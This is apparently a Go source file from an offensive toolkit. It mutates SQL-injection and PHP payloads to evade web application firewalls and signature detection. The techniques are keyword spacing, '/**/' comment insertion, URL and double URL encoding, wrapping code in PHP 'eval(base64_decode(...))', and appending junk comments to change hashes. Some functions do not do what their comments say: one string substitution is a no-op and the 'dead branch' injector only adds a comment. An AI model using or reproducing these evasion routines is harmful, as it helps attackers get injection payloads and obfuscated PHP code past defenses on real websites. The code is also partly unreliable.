package payloads

import (
	"encoding/base64"
	"net/url"
	"strings"
)

// WhitespaceVariant inserts spaces/tabs between tokens.
func WhitespaceVariant(s string) string {
	// Insert space between SQL keywords and PHP tokens
	replacer := strings.NewReplacer(
		"SELECT", "SELECT ",
		"FROM", " FROM",
		"WHERE", " WHERE",
		"<?php", "<?php  ",
		"eval", "ev al",
	)
	return replacer.Replace(s)
}

// AlternateEncoding hex/url-encodes keywords.
func AlternateEncoding(s string) string {
	// URL-encode common WAF-blocked keywords
	keywords := []string{"SELECT", "UNION", "INSERT", "DROP", "EXEC", "eval"}
	result := s
	for _, kw := range keywords {
		encoded := url.QueryEscape(kw)
		result = strings.ReplaceAll(result, kw, encoded)
	}
	return result
}

// FragmentSubstitute breaks keywords into concatenated fragments.
func FragmentSubstitute(s string) string {
	return strings.ReplaceAll(s, "eval", `ev`+`al`)
}

// FunctionWrap wraps payload in base64 eval.
func FunctionWrap(s string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(s))
	return `eval(base64_decode("` + encoded + `"))`
}

// CommentInject inserts /**/ between SQL/PHP tokens.
func CommentInject(s string) string {
	return strings.NewReplacer(
		" SELECT ", "/*x*/SELECT/*x*/",
		" FROM ", "/*x*/FROM/*x*/",
		" WHERE ", "/*x*/WHERE/*x*/",
	).Replace(s)
}

// DoubleEncode applies double URL-encoding.
func DoubleEncode(s string) string {
	return url.QueryEscape(url.QueryEscape(s))
}

// DeadcodeInject adds dead branches to change the payload's hash signature.
func DeadcodeInject(s string) string {
	return s + `/* _ksz=` + strings.Repeat("x", 8) + ` */`
}
